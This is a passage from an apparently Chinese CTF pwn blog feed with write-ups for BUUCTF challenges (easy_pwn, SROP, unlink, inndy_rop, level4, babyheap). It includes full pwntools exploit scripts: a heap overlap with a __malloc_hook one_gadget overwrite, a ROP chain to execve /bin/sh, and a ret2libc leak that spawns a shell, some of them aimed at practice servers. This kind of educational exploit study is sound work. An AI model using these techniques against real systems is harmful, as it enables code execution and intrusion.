alt="image-20240319214501997"></p><h5 id="不过最后的话，是打不通的。"><a href="#不过最后的话，是打不通的。" class="headerlink" title="不过最后的话，是打不通的。"></a>不过最后的话，是打不通的。</h5><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">'node5.buuoj.cn'</span>,<span class="number">28118</span>)</span><br><span class="line"><span class="comment">#r=process('roarctf_2019_easy_pwn')</span></span><br><span class="line">libc=ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    r.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    r.sendline(<span class="string">'1'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'size:'</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,data</span>):</span><br><span class="line">    r.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    r.sendline(<span class="string">'2'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    r.recvuntil(<span class="string">'size:'</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">    r.send(data)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    r.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    r.sendline(<span class="string">'3'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    r.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    r.sendline(<span class="string">'4'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))  </span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x22</span>,<span class="string">b'b'</span>*<span class="number">0x10</span>+p64(<span class="number">0x20</span>)+p8(<span class="number">0xa1</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x80</span>,p64(<span class="number">0</span>)*<span class="number">14</span>+p64(<span class="number">0xa0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0xa1</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">r.recv(<span class="number">0x20</span>)</span><br><span class="line">main_arena=u64(r.recvuntil(<span class="string">'\x7f'</span>).strip()[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))-<span class="number">88</span></span><br><span class="line">malloc_hook=main_arena-<span class="number">0x10</span></span><br><span class="line">base=malloc_hook-libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">realloc_hook=base+libc.sym[<span class="string">'__realloc_hook'</span>]</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena))</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x71</span>)+p64(<span class="number">0</span>)*<span class="number">12</span>+p64(<span class="number">0x70</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x90</span>,payload)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x71</span>)+p64(malloc_hook-<span class="number">0x23</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x28</span>,payload)</span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">one=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">one_gadget=base+one[<span class="number">3</span>]</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x1b</span>,<span class="string">b'a'</span>*<span class="number">11</span>+p64(one_gadget)+p64(realloc_hook+<span class="number">4</span>))</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_2019_es_7</title>
      <link href="//posts/79adbc41/"/>
      <url>//posts/79adbc41/</url>
      
        <content type="html"><![CDATA[<h5 id="初遇srop"><a href="#初遇srop" class="headerlink" title="初遇srop"></a>初遇srop</h5><p><img src="https://i0.imgs.ovh/2024/03/17/e3xQs.png" alt="image-20240318211119440"></p><p><img src="https://i0.imgs.ovh/2024/03/17/e3KTX.png" alt="image-20240318211144301"></p><p>unix在系统发生signal时会间接调用sigreturn,ucontext,siginfo等会被压入栈中,这一段称为signal frame</p><p><img src="https://i0.imgs.ovh/2024/03/17/e3olU.png" alt="image-20240318212003314"></p><p>要用srop，需满足几个条件</p><p>可以通过栈溢出控制栈的内容。</p><p>需要知道相应的地址。</p><pre><code>     “/bin/sh”</code></pre><p>​        Signal Frame</p><p>​        syscall</p><p>​        sigreturn</p><p>题目中已经给了我们gadgets的地址</p><p>首先可以打印出栈地址</p><p><img src="https://i0.imgs.ovh/2024/03/17/e3QBm.png" alt="image-20240318213204641"></p><p>其次返回地址写上了0x4004F1,打印完会再次返回func函数</p><p><img src="https://i0.imgs.ovh/2024/03/17/e3cvR.png" alt="image-20240318214547353"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hitcon2014_stkof</title>
      <link href="//posts/78860fdf/"/>
      <url>//posts/78860fdf/</url>
      
        <content type="html"><![CDATA[<h5 id="偏移都没开，有个堆溢出漏洞，刚巧不久前做了一道堆溢出，但是做法对于这道题没什么用，没有show函数，没有偏移保护可以用unlink"><a href="#偏移都没开，有个堆溢出漏洞，刚巧不久前做了一道堆溢出，但是做法对于这道题没什么用，没有show函数，没有偏移保护可以用unlink" class="headerlink" title="偏移都没开，有个堆溢出漏洞，刚巧不久前做了一道堆溢出，但是做法对于这道题没什么用，没有show函数，没有偏移保护可以用unlink"></a>偏移都没开，有个堆溢出漏洞，刚巧不久前做了一道堆溢出，但是做法对于这道题没什么用，没有show函数，没有偏移保护可以用unlink</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x30</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">bss=<span class="number">0x602140</span>+<span class="number">0x10</span></span><br><span class="line">fd=bss-<span class="number">0x18</span></span><br><span class="line">bk=bss-<span class="number">0x10</span></span><br><span class="line">payload=p32(<span class="number">0</span>)+p32(<span class="number">0x30</span>)</span><br><span class="line">payload+=p64(fd)+p64(bk)</span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload+=p64(<span class="number">0x30</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br></pre></td></tr></tbody></table></figure><p><img src="https://i0.imgs.ovh/2024/03/15/eVoRI.png" alt="image-20240316223611733"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>inndy_rop</title>
      <link href="//posts/19fdcc0c/"/>
      <url>//posts/19fdcc0c/</url>
      
        <content type="html"><![CDATA[<p><img src="https://i0.imgs.ovh/2024/03/13/chENt.png" alt="image-20240314194629081"></p><p>除了个gets函数啥也没有了</p><p><img src="https://i0.imgs.ovh/2024/03/13/chDtC.png" alt="image-20240314194446848"></p><h5 id="直接-ROPgadget-—binary-inndy-rop-—ropchain"><a href="#直接-ROPgadget-—binary-inndy-rop-—ropchain" class="headerlink" title="直接 ROPgadget —binary inndy_rop —ropchain"></a>直接 ROPgadget —binary inndy_rop —ropchain</h5><p><img src="https://i0.imgs.ovh/2024/03/13/chqwm.png" alt="image-20240314194655817"></p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote("node4.buuoj.cn",)</span></span><br><span class="line">r=process(<span class="string">"./inndy_rop"</span>)</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">p=<span class="string">b'a'</span>*(<span class="number">0xc</span>+<span class="number">4</span>)</span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">b'/bin'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">b'//sh'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080de769</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806c943</span>) <span class="comment"># int 0x80</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line"></span><br><span class="line">r.sendline(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>level4</title>
      <link href="//posts/7792b02a/"/>
      <url>//posts/7792b02a/</url>
      
        <content type="html"><![CDATA[<p>只开了NX保护，32位栈溢出。</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(proc_name)</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">'main'</span>]</span><br><span class="line">payload = <span class="string">b'a'</span> * (<span class="number">0x88</span> + <span class="number">0x4</span>) + p32(write_plt) + p32(main_addr) + p32(<span class="number">0x1</span>) + p32(write_got) + p32(<span class="number">0x4</span>)</span><br></pre></td></tr></tbody></table></figure><h5 id="没调用write函数前"><a href="#没调用write函数前" class="headerlink" title="没调用write函数前"></a>没调用write函数前</h5><p><img src="https://i0.imgs.ovh/2024/03/13/c6Qi2.png" alt="image-20240314145631680"></p><h5 id="got表存的是寻址的地址"><a href="#got表存的是寻址的地址" class="headerlink" title="got表存的是寻址的地址"></a>got表存的是寻址的地址<img src="https://i0.imgs.ovh/2024/03/13/c6JpW.png" alt="image-20240314145743045"></h5><h5 id="跳转到write-got存的地址write-plt-6"><a href="#跳转到write-got存的地址write-plt-6" class="headerlink" title="跳转到write_got存的地址write_plt+6"></a>跳转到write_got存的地址write_plt+6</h5><p><img src="https://i0.imgs.ovh/2024/03/13/c64s9.png" alt="image-20240314145920863"></p><p><img src="https://i0.imgs.ovh/2024/03/13/c6dVH.png" alt="image-20240314150124101"></p><p><img src="https://i0.imgs.ovh/2024/03/13/c65iO.png" alt="image-20240314150041605"></p><p><img src="https://i0.imgs.ovh/2024/03/13/c6yjC.png" alt="image-20240314150231093"></p><p><img src="https://i0.imgs.ovh/2024/03/13/cWPVt.png" alt="image-20240314150335322"></p><p><img src="https://i0.imgs.ovh/2024/03/13/cWVkm.png" alt="image-20240314150533997"></p><h5 id="总结起来就是，没调用write函数之前，write-got存的是write-plt-6这个地址，然后执行write-plt会去write-got里找write函数真正的地址，此时会执行write-plt-6这个地址寻址，找到write函数真正的地址后会把它存入write-got"><a href="#总结起来就是，没调用write函数之前，write-got存的是write-plt-6这个地址，然后执行write-plt会去write-got里找write函数真正的地址，此时会执行write-plt-6这个地址寻址，找到write函数真正的地址后会把它存入write-got" class="headerlink" title="总结起来就是，没调用write函数之前，write_got存的是write_plt+6这个地址，然后执行write_plt会去write_got里找write函数真正的地址，此时会执行write_plt+6这个地址寻址，找到write函数真正的地址后会把它存入write_got."></a>总结起来就是，没调用write函数之前，write_got存的是write_plt+6这个地址，然后执行write_plt会去write_got里找write函数真正的地址，此时会执行write_plt+6这个地址寻址，找到write函数真正的地址后会把它存入write_got.</h5><p><img src="https://i0.imgs.ovh/2024/03/13/cW2wp.png" alt="image-20240314151444152"></p><p><img src="https://i0.imgs.ovh/2024/03/13/cWnxd.png" alt="image-20240314152016165"></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">proc_name = <span class="string">'./level4'</span></span><br><span class="line">p = process(proc_name)</span><br><span class="line"><span class="comment">#p=remote('node5.buuoj.cn',29402)                                                                                                                                                   </span></span><br><span class="line">elf = ELF(proc_name)</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">'main'</span>]</span><br><span class="line">payload = <span class="string">b'a'</span> * (<span class="number">0x88</span> + <span class="number">0x4</span>) + p32(write_plt) + p32(main_addr) + p32(<span class="number">0x1</span>) + p32(write_got) + p32(<span class="number">0x4</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = LibcSearcher('write', write_addr)</span></span><br><span class="line">libc=ELF(<span class="string">'./libc-2.23_32.so'</span>)</span><br><span class="line"></span><br><span class="line">libc_base = write_addr - libc.sym[<span class="string">'write'</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">str_bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b'bin/sh'</span>))</span><br><span class="line">payload1 = <span class="string">b'a'</span> * (<span class="number">0x88</span> + <span class="number">0x4</span>) + p32(system_addr) + p32(main_addr) + p32(str_bin_sh)</span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>babyheap_0ctf_2017</title>
      <link href="//posts/1a2f921f/"/>
      <url>//posts/1a2f921f/</url>
      
        <content type="html"><![CDATA[<p>保护全开</p><h5 id="malloc-add都整得挺抽象的，但都大同小异。这道题还是挺有难度的"><a href="#malloc-add都整得挺抽象的，但都大同小异。这道题还是挺有难度的" class="headerlink" title="malloc,add都整得挺抽象的，但都大同小异。这道题还是挺有难度的"></a>malloc,add都整得挺抽象的，但都大同小异。这道题还是挺有难度的</h5><p>有个填充的时候的size可以大于自己申请的，有个堆溢出漏洞。</p><p><img src="https://i0.imgs.ovh/2024/03/12/cnbtX.png" alt="image-20240313194053956"></p><p>尝试改下个堆的size，再释放，再malloc，会报错，这个方法不行。</p><p><img src="https://i0.imgs.ovh/2024/03/12/cHClH.png" alt="image-20240313202940866"></p><p>改掉了bin指针</p><p><img src="https://i0.imgs.ovh/2024/03/12/cHpbm.png" alt="image-20240313205043694"></p><p><img src="https://i0.imgs.ovh/2024/03/12/cH61T.png" alt="image-20240313205752854"></p><p><img src="https://i0.imgs.ovh/2024/03/12/cHgnO.png" alt="image-20240313221321740"></p><p><img src="https://i0.imgs.ovh/2024/03/12/cHsn2.png" alt="image-20240313212014082"></p><p><img src="https://i0.imgs.ovh/2024/03/12/cHcT9.png" alt="image-20240313221044009"></p><p><img src="https://i0.imgs.ovh/2024/03/12/cHtoH.png" alt="image-20240313221647152"></p><p><img src="https://i0.imgs.ovh/2024/03/12/cHjys.png" alt="image-20240313222042253"></p><h5 id="堆2是指向free-chunk的，填充堆2也就是在fast-bin的指针上写上malloc-hook上面的地址，溢出堆3也能改bin指针。这里的地址有一定的要求。"><a href="#堆2是指向free-chunk的，填充堆2也就是在fast-bin的指针上写上malloc-hook上面的地址，溢出堆3也能改bin指针。这里的地址有一定的要求。" class="headerlink" title="堆2是指向free_chunk的，填充堆2也就是在fast_bin的指针上写上malloc_hook上面的地址，溢出堆3也能改bin指针。这里的地址有一定的要求。"></a>堆2是指向free_chunk的，填充堆2也就是在fast_bin的指针上写上malloc_hook上面的地址，溢出堆3也能改bin指针。这里的地址有一定的要求。</h5><p><img src="https://i0.imgs.ovh/2024/03/12/cHymu.png" alt="image-20240313230951923"></p><h5 id="在malloc-hook-0x23的地址上，dword-malloc-hook-0x23-0x8-这个地址的值是0x7f-满足0x70大小的fastbin的大小，所以malloc-hook-0x23这个地址可以当作fake-addr-再填充0x13字节到malloc-hook-写上one-gadget"><a href="#在malloc-hook-0x23的地址上，dword-malloc-hook-0x23-0x8-这个地址的值是0x7f-满足0x70大小的fastbin的大小，所以malloc-hook-0x23这个地址可以当作fake-addr-再填充0x13字节到malloc-hook-写上one-gadget" class="headerlink" title="在malloc_hook-0x23的地址上，dword(malloc_hook-0x23+0x8)这个地址的值是0x7f,满足0x70大小的fastbin的大小，所以malloc_hook-0x23这个地址可以当作fake_addr,再填充0x13字节到malloc_hook,写上one_gadget."></a>在malloc_hook-0x23的地址上，dword(malloc_hook-0x23+0x8)这个地址的值是0x7f,满足0x70大小的fastbin的大小，所以malloc_hook-0x23这个地址可以当作fake_addr,再填充0x13字节到malloc_hook,写上one_gadget.</h5><p><img src="https://i0.imgs.ovh/2024/03/13/cf7Ou.png" alt="image-20240314130240170"></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote("node5.buuoj.cn",26041)</span></span><br><span class="line">p=process(<span class="string">"./babyheap_0ctf_2017"</span>)</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">p.sendlineafter(<span class="string">'Command: '</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Size: '</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">full</span>(<span class="params">index,size,content</span>):</span><br><span 